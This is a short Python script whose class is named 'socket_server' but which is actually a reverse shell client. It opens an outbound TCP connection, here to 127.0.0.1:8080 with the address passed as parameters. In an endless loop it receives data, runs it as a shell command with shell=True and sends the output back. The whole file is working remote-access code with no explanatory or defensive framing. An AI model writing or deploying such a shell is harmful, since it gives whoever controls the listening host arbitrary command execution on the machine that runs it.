#!/usr/bin/env python
import socket, subprocess


class socket_server:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def execute_command(self, command):
        return subprocess.check_output(command.decode('utf-8'), shell=True)

    def run(self):
        while True:
            r = self.s.recv(1024)
            command = self.execute_command(r)
            self.s.send(command)


if __name__ == '__main__':
    connect = socket_server("127.0.0.1", 8080)
    connect.run()